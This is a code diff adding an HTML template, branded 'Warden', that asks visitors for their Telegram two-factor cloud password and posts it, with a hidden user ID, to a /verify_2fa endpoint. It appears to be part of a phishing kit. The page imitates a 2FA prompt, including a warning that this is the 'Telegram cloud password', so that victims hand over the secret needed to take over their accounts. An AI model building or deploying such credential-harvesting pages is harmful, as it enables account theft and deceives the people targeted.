@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Warden — 2FA</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#04060e;--surface:rgba(255,255,255,0.03);--border:rgba(255,255,255,0.06);--text:#e2e8f0;--muted:#64748b;--green:#22c55e;--red:#ef4444;--yellow:#f59e0b}
+body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center}
+.grid-bg{position:fixed;inset:0;background-image:linear-gradient(rgba(34,197,94,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(34,197,94,0.03) 1px,transparent 1px);background-size:48px 48px;animation:gridMove 20s linear infinite}
+@keyframes gridMove{from{background-position:0 0}to{background-position:48px 48px}}
+.card{position:relative;z-index:1;background:var(--surface);border:1px solid var(--border);border-radius:24px;padding:48px 40px;max-width:440px;width:100%;backdrop-filter:blur(12px);animation:fadeUp .5s ease both}
+@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+.icon{font-size:40px;margin-bottom:20px;display:block;text-align:center}
+.step-label{font-family:'Space Mono',monospace;font-size:11px;letter-spacing:.1em;color:var(--yellow);margin-bottom:16px}
+h2{font-size:26px;font-weight:800;margin-bottom:8px;letter-spacing:-.02em}
+.sub{font-size:13px;color:var(--muted);margin-bottom:28px;line-height:1.5}
+.warn-box{background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.2);border-radius:12px;padding:14px 16px;margin-bottom:24px;font-size:12px;color:var(--yellow);line-height:1.5}
+label{display:block;font-size:12px;font-weight:700;letter-spacing:.05em;color:var(--muted);margin-bottom:6px;text-transform:uppercase}
+.pwd-wrap{position:relative;margin-bottom:16px}
+input[type=password],input[type=text]{width:100%;padding:14px 48px 14px 16px;background:rgba(255,255,255,0.04);border:1px solid var(--border);border-radius:12px;color:var(--text);font-family:'Space Mono',monospace;font-size:15px;outline:none;transition:.2s}
+input:focus{border-color:var(--yellow);background:rgba(245,158,11,0.04)}
+input::placeholder{color:var(--muted)}
+.eye{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;font-size:18px;color:var(--muted);transition:.15s}
+.eye:hover{color:var(--text)}
+.btn{width:100%;padding:16px;background:var(--green);color:#04060e;font-family:'Syne',sans-serif;font-size:15px;font-weight:700;border:none;border-radius:14px;cursor:pointer;transition:.2s;margin-top:4px}
+.btn:hover{background:#16a34a;transform:translateY(-1px)}
+.btn:disabled{background:#2d3748;color:var(--muted);cursor:not-allowed;transform:none}
+.error{color:var(--red);font-size:13px;margin-top:12px;display:none;padding:10px 14px;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);border-radius:10px}
+</style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="card">
+  <span class="icon">🔐</span>
+  <div class="step-label">TWO-FACTOR AUTHENTICATION</div>
+  <h2>Enter 2FA Password</h2>
+  <p class="sub">Your account has two-factor authentication enabled. Enter your cloud password to continue.</p>
+  <div class="warn-box">⚠️ This is your Telegram cloud password, not your phone PIN.</div>
+ 
+  <form action="/verify_2fa" method="post" onsubmit="handleSubmit(event)">
+    <label>Cloud Password</label>
+    <div class="pwd-wrap">
+      <input type="password" id="password" name="password" placeholder="••••••••" required autocomplete="current-password">
+      <button type="button" class="eye" onclick="togglePwd()" id="eyeBtn">👁</button>
+    </div>
+    <input type="hidden" name="user_id" value="{{ user_id }}">
+    <button type="submit" class="btn" id="submitBtn">Confirm →</button>
+  </form>
+  <div class="error" id="errorMsg"></div>
+</div>
+<script>
+function togglePwd() {
+  const inp = document.getElementById('password');
+  const btn = document.getElementById('eyeBtn');
+  if (inp.type === 'password') { inp.type = 'text'; btn.textContent = '🙈'; }
+  else { inp.type = 'password'; btn.textContent = '👁'; }
+}
+function handleSubmit(e) {
+  const pwd = document.getElementById('password').value;
+  const err = document.getElementById('errorMsg');
+  err.style.display = 'none';
+  if (!pwd || pwd.length < 1) {
+    e.preventDefault();
+    err.textContent = 'Please enter your 2FA password.';
+    err.style.display = 'block';
+    return;
+  }
+  const btn = document.getElementById('submitBtn');
+  btn.disabled = true;
+  btn.textContent = 'Verifying...';
+}
+</script>
+</body>
+</html>
+ 
